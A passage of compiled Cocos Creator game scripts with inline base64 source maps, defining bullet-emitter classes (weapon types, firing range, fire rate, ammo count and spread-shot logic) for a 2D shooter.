bGxldEVtaXR0ZXIge1xyXG5cclxuICAgIHN0YXRpYyBUWVBFUyA9IHtcclxuICAgICAgICBTaG91UWlhbmcgOiAxLFxyXG4gICAgICAgIFBlblppIDogMixcclxuICAgICAgICBKaWFUZUxpbiA6IDMsXHJcbiAgICAgICAgU2FuRGFuUWlhbmcgOiA0LFxyXG4gICAgICAgIEh1b1lhbiA6IDUsXHJcbiAgICAgICAgSmlHdWFuZyA6IDYsXHJcbiAgICAgICAgSnVKaVFpYW5nIDogNyxcclxuICAgICAgICBMaVppUGFvIDogOCxcclxuICAgICAgICBIdW9KaWFuVG9uZyA6IDksXHJcbiAgICAgICAgU2hhbkRpYW5RaXUgOiAxMCxcclxuICAgIH07XHJcblxyXG4gICAgcHJvdGVjdGVkIGNvbnN0cnVjdG9yKGdhbWVCdWxsZXRzQ29udHJvbGxlcjpHYW1lQnVsbGV0c0NvbnRyb2xsZXIpe1xyXG4gICAgICAgIHRoaXMuX2dhbWVCdWxsZXRzQ29udHJvbGxlciA9IGdhbWVCdWxsZXRzQ29udHJvbGxlcjtcclxuICAgIH1cclxuICAgIHByaXZhdGUgX2dhbWVCdWxsZXRzQ29udHJvbGxlcjpHYW1lQnVsbGV0c0NvbnRyb2xsZXIgPSBudWxsO1xyXG5cclxuXHJcbiAgICAvKiog5bCE56iLICovXHJcbiAgICBwcm90ZWN0ZWQgX2ZpcmluZ1JhbmdlID0gMDtcclxuXHJcbiAgICBnZXQgZmlyaW5nUmFuZ2UoKTogbnVtYmVyIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5fZmlyaW5nUmFuZ2U7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOWPkeWwhOmXtOmalCAqL1xyXG4gICAgcHJvdGVjdGVkIF9pbnRlcnZhbCA9IDA7XHJcblxyXG5cclxuICAgIGdldCBpbnRlcnZhbCgpOiBudW1iZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9pbnRlcnZhbDtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5a2Q5by555qE6YCf5bqmICovXHJcbiAgICBwcm90ZWN0ZWQgX3NwZWVkID0gMDtcclxuXHJcblxyXG4gICAgZ2V0IHNwZWVkKCk6IG51bWJlciB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX3NwZWVkO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKiDlvLnlrrnph48gKi9cclxuICAgIHByaXZhdGUgX3BheWxvYWQgPSAwO1xyXG5cclxuICAgIGdldCBwYXlsb2FkKCk6IG51bWJlciB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX3BheWxvYWQ7XHJcbiAgICB9XHJcblxyXG4gICAgc2V0IHBheWxvYWQodmFsdWU6IG51bWJlcikge1xyXG4gICAgICAgIHRoaXMuX3BheWxvYWQgPSB2YWx1ZTtcclxuICAgICAgICB0aGlzLmJ1bGxldENvdW50ID0gdGhpcy5fcGF5bG9hZDtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5Ymp5L2Z5by56YePICovXHJcbiAgICBwcml2YXRlIF9idWxsZXRDb3VudCA9IDA7XHJcblxyXG5cclxuICAgIGdldCBidWxsZXRDb3VudCgpOiBudW1iZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9idWxsZXRDb3VudDtcclxuICAgIH1cclxuXHJcblxyXG4gICAgc2V0IGJ1bGxldENvdW50KHZhbHVlOiBudW1iZXIpIHtcclxuICAgICAgICB0aGlzLl9idWxsZXRDb3VudCA9IHZhbHVlO1xyXG4gICAgICAgIEdhbWVQcm94eS5lbWl0KEdhbWVQcm94eS5FdmVudC5VcGRhdGVCdWxsZXRDb3VudCk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOaYr+WQpuWtkOW8ueeUqOWwvSAqL1xyXG4gICAgaXNVc2VVcCgpe1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9wYXlsb2FkICE9IDAgJiYgdGhpcy5fYnVsbGV0Q291bnQgPCAxO1xyXG4gICAgfVxyXG5cclxuICAgIGdldCBnYW1lQnVsbGV0c0NvbnRyb2xsZXIoKTogR2FtZUJ1bGxldHNDb250cm9sbGVyIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5fZ2FtZUJ1bGxldHNDb250cm9sbGVyO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBwcm90ZWN0ZWQgX2J1bGxldEVtaXR0ZXJJRCA9IDA7XHJcblxyXG4gICAgaW5pdChpZDpudW1iZXIpe1xyXG4gICAgICAgIHRoaXMuX2J1bGxldEVtaXR0ZXJJRCA9IGlkO1xyXG4gICAgICAgIGxldCBjb25maWcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb24pW3RoaXMuX2J1bGxldEVtaXR0ZXJJRC0xXTtcclxuICAgICAgICB0aGlzLl9zcGVlZCA9IGNvbmZpZ1snc3BlZWQnXTtcclxuICAgICAgICB0aGlzLl9maXJpbmdSYW5nZSA9IGNvbmZpZ1sncmFuZ2UnXSpXb3JsZC5NeS5hcm1vcnkucmFuZ2VNdWxPZih0aGlzLl9idWxsZXRFbWl0dGVySUQpO1xyXG4gICAgICAgIHRoaXMuX2ludGVydmFsID0gY29uZmlnWydmcmUnXSpXb3JsZC5NeS5hcm1vcnkuZnJlTXVsT2YodGhpcy5fYnVsbGV0RW1pdHRlcklEKTtcclxuICAgICAgICB0aGlzLnBheWxvYWQgPSBXb3JsZC5NeS5hcm1vcnkucGF5bG9hZEFkZE9mKHRoaXMuX2J1bGxldEVtaXR0ZXJJRCk7XHJcbiAgICAgICAgY29uc29sZS5sb2coJ3BheWxvYWQ9PT0+JywgdGhpcy5fcGF5bG9hZCk7XHJcbiAgICB9XHJcblxyXG4gICAgYWJzdHJhY3QgZmlyZShzdGFydDogY2MuVmVjMiwgZGlyOiBjYy5WZWMyKTtcclxuXHJcbiAgICBvbkVudGVyKCl7fVxyXG4gICAgb25FeGl0KCl7fVxyXG59XHJcblxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletEmitter/BulletEmitterLiZiPao.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'c5068lByUNDfZVSWj7ABV1y', 'BulletEmitterLiZiPao');
// script/app/entities/bulletEmitter/BulletEmitterLiZiPao.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletEmitter_1 = require("./BulletEmitter");
var BulletEmitterLiZiPao = /** @class */ (function (_super) {
    __extends(BulletEmitterLiZiPao, _super);
    function BulletEmitterLiZiPao(gameBulletsController) {
        var _this = _super.call(this, gameBulletsController) || this;
        _this._firingRange = 500;
        _this._interval = 0.5;
        _this._speed = 800;
        return _this;
    }
    BulletEmitterLiZiPao.prototype.fire = function (start, dir) {
        this.bulletCount--;
        var bullet = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.LiZiPao);
        bullet.node.active = true;
        bullet.node.position = start;
        bullet.fly(dir, this._firingRange, this._speed);
    };
    return BulletEmitterLiZiPao;
}(BulletEmitter_1.default));
exports.default = BulletEmitterLiZiPao;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlckxpWmlQYW8udHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLGlEQUE0QztBQUc1QztJQUFrRCx3Q0FBYTtJQUUzRCw4QkFBWSxxQkFBMkM7UUFBdkQsWUFDSSxrQkFBTSxxQkFBcUIsQ0FBQyxTQUkvQjtRQUhHLEtBQUksQ0FBQyxZQUFZLEdBQUcsR0FBRyxDQUFDO1FBQ3hCLEtBQUksQ0FBQyxTQUFTLEdBQUcsR0FBRyxDQUFDO1FBQ3JCLEtBQUksQ0FBQyxNQUFNLEdBQUcsR0FBRyxDQUFDOztJQUN0QixDQUFDO0lBRUQsbUNBQUksR0FBSixVQUFLLEtBQWMsRUFBRSxHQUFZO1FBQzdCLElBQUksQ0FBQyxXQUFXLEVBQUUsQ0FBQztRQUNuQixJQUFJLE1BQU0sR0FBRyxJQUFJLENBQUMscUJBQXFCLENBQUMsaUJBQWlCLENBQUMsdUJBQWEsQ0FBQyxLQUFLLENBQUMsT0FBTyxDQUFDLENBQUM7UUFDdkYsTUFBTSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1FBQzFCLE1BQU0sQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLEtBQUssQ0FBQztRQUM3QixNQUFNLENBQUMsR0FBRyxDQUFDLEdBQUcsRUFBRSxJQUFJLENBQUMsWUFBWSxFQUFFLElBQUksQ0FBQyxNQUFNLENBQUMsQ0FBQztJQUNwRCxDQUFDO0lBRUwsMkJBQUM7QUFBRCxDQWpCQSxBQWlCQyxDQWpCaUQsdUJBQWEsR0FpQjlEIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBCdWxsZXRFbWl0dGVyIGZyb20gXCIuL0J1bGxldEVtaXR0ZXJcIjtcclxuaW1wb3J0IEdhbWVCdWxsZXRzQ29udHJvbGxlciBmcm9tIFwiLi4vLi4vZ2FtZS9HYW1lQnVsbGV0c0NvbnRyb2xsZXJcIjtcclxuXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEJ1bGxldEVtaXR0ZXJMaVppUGFvIGV4dGVuZHMgQnVsbGV0RW1pdHRlciB7XHJcblxyXG4gICAgY29uc3RydWN0b3IoZ2FtZUJ1bGxldHNDb250cm9sbGVyOkdhbWVCdWxsZXRzQ29udHJvbGxlcil7XHJcbiAgICAgICAgc3VwZXIoZ2FtZUJ1bGxldHNDb250cm9sbGVyKTtcclxuICAgICAgICB0aGlzLl9maXJpbmdSYW5nZSA9IDUwMDtcclxuICAgICAgICB0aGlzLl9pbnRlcnZhbCA9IDAuNTtcclxuICAgICAgICB0aGlzLl9zcGVlZCA9IDgwMDtcclxuICAgIH1cclxuXHJcbiAgICBmaXJlKHN0YXJ0OiBjYy5WZWMyLCBkaXI6IGNjLlZlYzIpIHtcclxuICAgICAgICB0aGlzLmJ1bGxldENvdW50LS07XHJcbiAgICAgICAgbGV0IGJ1bGxldCA9IHRoaXMuZ2FtZUJ1bGxldHNDb250cm9sbGVyLmdldEluYWN0aXZlQnVsbGV0KEJ1bGxldEVtaXR0ZXIuVFlQRVMuTGlaaVBhbyk7XHJcbiAgICAgICAgYnVsbGV0Lm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICBidWxsZXQubm9kZS5wb3NpdGlvbiA9IHN0YXJ0O1xyXG4gICAgICAgIGJ1bGxldC5mbHkoZGlyLCB0aGlzLl9maXJpbmdSYW5nZSwgdGhpcy5fc3BlZWQpO1xyXG4gICAgfVxyXG5cclxufVxyXG5cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletEmitter/BulletEmitterJiaTeLin.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '4db758f9P9A8LM9PRXQc7sC', 'BulletEmitterJiaTeLin');
// script/app/entities/bulletEmitter/BulletEmitterJiaTeLin.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletEmitter_1 = require("./BulletEmitter");
var BulletEmitterJiaTeLin = /** @class */ (function (_super) {
    __extends(BulletEmitterJiaTeLin, _super);
    function BulletEmitterJiaTeLin(gameBulletsController) {
        var _this = _super.call(this, gameBulletsController) || this;
        _this.degree = 0;
        _this.num = 0;
        _this._firingRange = 1000;
        _this._interval = 0.1;
        _this._speed = 1200;
        return _this;
    }
    BulletEmitterJiaTeLin.prototype.fire = function (start, dir) {
        this.bulletCount--;
        switch (this.num % 4) {
            case 0:
                /** 发射一颗 */
                {
                    var degree = Math.random() * 2;
                    this.degree = this.degree > 0 ? -degree : degree;
                    var bullet = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.JiaTeLin);
                    bullet.node.active = true;
                    bullet.node.position = start;
                    bullet.fly(dir.rotate(cc.misc.degreesToRadians(this.degree)), this._firingRange, this._speed);
                }
                break;
            case 1:
                /** 小角度同时发射两颗 */
                {
                    var degree = 3 + Math.random() * 5;
                    var bullet1 = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.JiaTeLin);
                    bullet1.node.active = true;
                    bullet1.node.position = start.add(dir.mul(Math.random() * -10));
                    bullet1.fly(dir.rotate(cc.misc.degreesToRadians(this.degree + degree)), this._firingRange, this._speed);
                    var bullet2 = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.JiaTeLin);
                    bullet2.node.active = true;
                    bullet2.node.position = start.add(dir.mul(Math.random() * 10));
                    bullet2.fly(dir.rotate(cc.misc.degreesToRadians(-this.degree - degree)), this._firingRange, this._speed);
                }
                break;
            case 2:
                /** 发射一颗 */
                {
                    var degree = Math.random() * 2;
                    this.degree = this.degree > 0 ? -degree : degree;
                    var bullet = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.JiaTeLin);
                    bullet.node.active = true;
                    bullet.node.position = start;
                    bullet.fly(dir.rotate(cc.misc.degreesToRadians(this.degree)), this._firingRange, this._speed);
                }
                break;
            case 3:
                /** 大角度同时发射两颗 */
                {
                    var degree = 10 + Math.random() * 5;
                    var bullet1 = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.JiaTeLin);
                    bullet1.node.active = true;
                    bullet1.node.position = start.add(dir.mul(Math.random() * -15));
                    bullet1.fly(dir.rotate(cc.misc.degreesToRadians(this.degree + degree)), this._firingRange, this._speed);
                    var bullet2 = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.JiaTeLin);
                    bullet2.node.active = true;
                    bullet2.node.position = start.add(dir.mul(Math.random() * 15));
                    bullet2.fly(dir.rotate(cc.misc.degreesToRadians(-this.degree - degree)), this._firingRange, this._speed);
                }
                break;
        }
        this.num++;
    };
    return BulletEmitterJiaTeLin;
}(BulletEmitter_1.default));
exports.default = BulletEmitterJiaTeLin;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlckppYVRlTGluLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxpREFBNEM7QUFJNUM7SUFBbUQseUNBQWE7SUFNNUQsK0JBQVkscUJBQTJDO1FBQXZELFlBQ0ksa0JBQU0scUJBQXFCLENBQUMsU0FJL0I7UUFUTyxZQUFNLEdBQUcsQ0FBQyxDQUFDO1FBRVgsU0FBRyxHQUFHLENBQUMsQ0FBQztRQUlaLEtBQUksQ0FBQyxZQUFZLEdBQUcsSUFBSSxDQUFDO1FBQ3pCLEtBQUksQ0FBQyxTQUFTLEdBQUcsR0FBRyxDQUFDO1FBQ3JCLEtBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDOztJQUN2QixDQUFDO0lBRUQsb0NBQUksR0FBSixVQUFLLEtBQWMsRUFBRSxHQUFZO1FBQzdCLElBQUksQ0FBQyxXQUFXLEVBQUUsQ0FBQztRQUNuQixRQUFRLElBQUksQ0FBQyxHQUFHLEdBQUMsQ0FBQyxFQUFDO1lBQ2YsS0FBSyxDQUFDO2dCQUNGLFdBQVc7Z0JBQ2Y7b0JBQ0ksSUFBSSxNQUFNLEdBQUcsSUFBSSxDQUFDLE1BQU0sRUFBRSxHQUFDLENBQUMsQ0FBQztvQkFDN0IsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUMsTUFBTSxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQztvQkFDakQsSUFBSSxNQUFNLEdBQUcsSUFBSSxDQUFDLHFCQUFxQixDQUFDLGlCQUFpQixDQUFDLHVCQUFhLENBQUMsS0FBSyxDQUFDLFFBQVEsQ0FBQyxDQUFDO29CQUN4RixNQUFNLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7b0JBQzFCLE1BQU0sQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLEtBQUssQ0FBQztvQkFFN0IsTUFBTSxDQUFDLEdBQUcsQ0FBQyxHQUFHLENBQUMsTUFBTSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsZ0JBQWdCLENBQUMsSUFBSSxDQUFDLE1BQU0sQ0FBQyxDQUFDLEVBQUUsSUFBSSxDQUFDLFlBQVksRUFBRSxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7aUJBQ2pHO2dCQUNHLE1BQU07WUFDVixLQUFLLENBQUM7Z0JBQ0YsZ0JBQWdCO2dCQUNwQjtvQkFDSSxJQUFJLE1BQU0sR0FBRyxDQUFDLEdBQUcsSUFBSSxDQUFDLE1BQU0sRUFBRSxHQUFHLENBQUMsQ0FBQztvQkFDbkMsSUFBSSxPQUFPLEdBQUcsSUFBSSxDQUFDLHFCQUFxQixDQUFDLGlCQUFpQixDQUFDLHVCQUFhLENBQUMsS0FBSyxDQUFDLFFBQVEsQ0FBQyxDQUFDO29CQUN6RixPQUFPLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7b0JBQzNCLE9BQU8sQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLEtBQUssQ0FBQyxHQUFHLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsTUFBTSxFQUFFLEdBQUMsQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDO29CQUU5RCxPQUFPLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxnQkFBZ0IsQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFDLE1BQU0sQ0FBQyxDQUFDLEVBQUUsSUFBSSxDQUFDLFlBQVksRUFBRSxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7b0JBRXRHLElBQUksT0FBTyxHQUFHLElBQUksQ0FBQyxxQkFBcUIsQ0FBQyxpQkFBaUIsQ0FBQyx1QkFBYSxDQUFDLEtBQUssQ0FBQyxRQUFRLENBQUMsQ0FBQztvQkFDekYsT0FBTyxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO29CQUMzQixPQUFPLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxLQUFLLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxHQUFHLENBQUMsSUFBSSxDQUFDLE1BQU0sRUFBRSxHQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUM7b0JBRTdELE9BQU8sQ0FBQyxHQUFHLENBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLGdCQUFnQixDQUFDLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBQyxNQUFNLENBQUMsQ0FBQyxFQUFFLElBQUksQ0FBQyxZQUFZLEVBQUUsSUFBSSxDQUFDLE1BQU0sQ0FBQyxDQUFDO2lCQUMxRztnQkFDRyxNQUFNO1lBQ1YsS0FBSyxDQUFDO2dCQUNGLFdBQVc7Z0JBQ2Y7b0JBQ0ksSUFBSSxNQUFNLEdBQUcsSUFBSSxDQUFDLE1BQU0sRUFBRSxHQUFDLENBQUMsQ0FBQztvQkFDN0IsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUMsTUFBTSxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQztvQkFDakQsSUFBSSxNQUFNLEdBQUcsSUFBSSxDQUFDLHFCQUFxQixDQUFDLGlCQUFpQixDQUFDLHVCQUFhLENBQUMsS0FBSyxDQUFDLFFBQVEsQ0FBQyxDQUFDO29CQUN4RixNQUFNLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7b0JBQzFCLE1BQU0sQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLEtBQUssQ0FBQztvQkFFN0IsTUFBTSxDQUFDLEdBQUcsQ0FBQyxHQUFHLENBQUMsTUFBTSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsZ0JBQWdCLENBQUMsSUFBSSxDQUFDLE1BQU0sQ0FBQyxDQUFDLEVBQUUsSUFBSSxDQUFDLFlBQVksRUFBRSxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7aUJBQ2pHO2dCQUNHLE1BQU07WUFDVixLQUFLLENBQUM7Z0JBQ0YsZ0JBQWdCO2dCQUNwQjtvQkFDSSxJQUFJLE1BQU0sR0FBRyxFQUFFLEdBQUcsSUFBSSxDQUFDLE1BQU0sRUFBRSxHQUFHLENBQUMsQ0FBQztvQkFDcEMsSUFBSSxPQUFPLEdBQUcsSUFBSSxDQUFDLHFCQUFxQixDQUFDLGlCQUFpQixDQUFDLHVCQUFhLENBQUMsS0FBSyxDQUFDLFFBQVEsQ0FBQyxDQUFDO29CQUN6RixPQUFPLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7b0JBQzNCLE9BQU8sQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLEtBQUssQ0FBQyxHQUFHLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsTUFBTSxFQUFFLEdBQUMsQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDO29CQUU5RCxPQUFPLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxnQkFBZ0IsQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFDLE1BQU0sQ0FBQyxDQUFDLEVBQUUsSUFBSSxDQUFDLFlBQVksRUFBRSxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7b0JBRXRHLElBQUksT0FBTyxHQUFHLElBQUksQ0FBQyxxQkFBcUIsQ0FBQyxpQkFBaUIsQ0FBQyx1QkFBYSxDQUFDLEtBQUssQ0FBQyxRQUFRLENBQUMsQ0FBQztvQkFDekYsT0FBTyxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO29CQUMzQixPQUFPLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxLQUFLLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxHQUFHLENBQUMsSUFBSSxDQUFDLE1BQU0sRUFBRSxHQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUM7b0JBRTdELE9BQU8sQ0FBQyxHQUFHLENBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLGdCQUFnQixDQUFDLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBQyxNQUFNLENBQUMsQ0FBQyxFQUFFLElBQUksQ0FBQyxZQUFZLEVBQUUsSUFBSSxDQUFDLE1BQU0sQ0FBQyxDQUFDO2lCQUMxRztnQkFDRyxNQUFNO1NBQ2I7UUFDRCxJQUFJLENBQUMsR0FBRyxFQUFFLENBQUM7SUFDZixDQUFDO0lBQ0wsNEJBQUM7QUFBRCxDQTdFQSxBQTZFQyxDQTdFa0QsdUJBQWEsR0E2RS9EIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBCdWxsZXRFbWl0dGVyIGZyb20gXCIuL0J1bGxldEVtaXR0ZXJcIjtcclxuaW1wb3J0IEdhbWVCdWxsZXRzQ29udHJvbGxlciBmcm9tIFwiLi4vLi4vZ2FtZS9HYW1lQnVsbGV0c0NvbnRyb2xsZXJcIjtcclxuXHJcblxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBCdWxsZXRFbWl0dGVySmlhVGVMaW4gZXh0ZW5kcyBCdWxsZXRFbWl0dGVyIHtcclxuXHJcbiAgICBwcml2YXRlIGRlZ3JlZSA9IDA7XHJcblxyXG4gICAgcHJpdmF0ZSBudW0gPSAwO1xyXG5cclxuICAgIGNvbnN0cnVjdG9yKGdhbWVCdWxsZXRzQ29udHJvbGxlcjpHYW1lQnVsbGV0c0NvbnRyb2xsZXIpe1xyXG4gICAgICAgIHN1cGVyKGdhbWVCdWxsZXRzQ29udHJvbGxlcik7XHJcbiAgICAgICAgdGhpcy5fZmlyaW5nUmFuZ2UgPSAxMDAwO1xyXG4gICAgICAgIHRoaXMuX2ludGVydmFsID0gMC4xO1xyXG4gICAgICAgIHRoaXMuX3NwZWVkID0gMTIwMDtcclxuICAgIH1cclxuXHJcbiAgICBmaXJlKHN0YXJ0OiBjYy5WZWMyLCBkaXI6IGNjLlZlYzIpIHtcclxuICAgICAgICB0aGlzLmJ1bGxldENvdW50LS07XHJcbiAgICAgICAgc3dpdGNoICh0aGlzLm51bSU0KXtcclxuICAgICAgICAgICAgY2FzZSAwOlxyXG4gICAgICAgICAgICAgICAgLyoqIOWPkeWwhOS4gOmilyAqL1xyXG4gICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICBsZXQgZGVncmVlID0gTWF0aC5yYW5kb20oKSoyO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5kZWdyZWUgPSB0aGlzLmRlZ3JlZSA+IDAgPyAtZGVncmVlIDogZGVncmVlO1xyXG4gICAgICAgICAgICAgICAgbGV0IGJ1bGxldCA9IHRoaXMuZ2FtZUJ1bGxldHNDb250cm9sbGVyLmdldEluYWN0aXZlQnVsbGV0KEJ1bGxldEVtaXR0ZXIuVFlQRVMuSmlhVGVMaW4pO1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLnBvc2l0aW9uID0gc3RhcnQ7XHJcblxyXG4gICAgICAgICAgICAgICAgYnVsbGV0LmZseShkaXIucm90YXRlKGNjLm1pc2MuZGVncmVlc1RvUmFkaWFucyh0aGlzLmRlZ3JlZSkpLCB0aGlzLl9maXJpbmdSYW5nZSwgdGhpcy5fc3BlZWQpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgY2FzZSAxOlxyXG4gICAgICAgICAgICAgICAgLyoqIOWwj+inkuW6puWQjOaXtuWPkeWwhOS4pOmilyAqL1xyXG4gICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICBsZXQgZGVncmVlID0gMyArIE1hdGgucmFuZG9tKCkgKiA1O1xyXG4gICAgICAgICAgICAgICAgbGV0IGJ1bGxldDEgPSB0aGlzLmdhbWVCdWxsZXRzQ29udHJvbGxlci5nZXRJbmFjdGl2ZUJ1bGxldChCdWxsZXRFbWl0dGVyLlRZUEVTLkppYVRlTGluKTtcclxuICAgICAgICAgICAgICAgIGJ1bGxldDEubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0MS5ub2RlLnBvc2l0aW9uID0gc3RhcnQuYWRkKGRpci5tdWwoTWF0aC5yYW5kb20oKSotMTApKTtcclxuXHJcbiAgICAgICAgICAgICAgICBidWxsZXQxLmZseShkaXIucm90YXRlKGNjLm1pc2MuZGVncmVlc1RvUmFkaWFucyh0aGlzLmRlZ3JlZStkZWdyZWUpKSwgdGhpcy5fZmlyaW5nUmFuZ2UsIHRoaXMuX3NwZWVkKTtcclxuXHJcbiAgICAgICAgICAgICAgICBsZXQgYnVsbGV0MiA9IHRoaXMuZ2FtZUJ1bGxldHNDb250cm9sbGVyLmdldEluYWN0aXZlQnVsbGV0KEJ1bGxldEVtaXR0ZXIuVFlQRVMuSmlhVGVMaW4pO1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0Mi5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICBidWxsZXQyLm5vZGUucG9zaXRpb24gPSBzdGFydC5hZGQoZGlyLm11bChNYXRoLn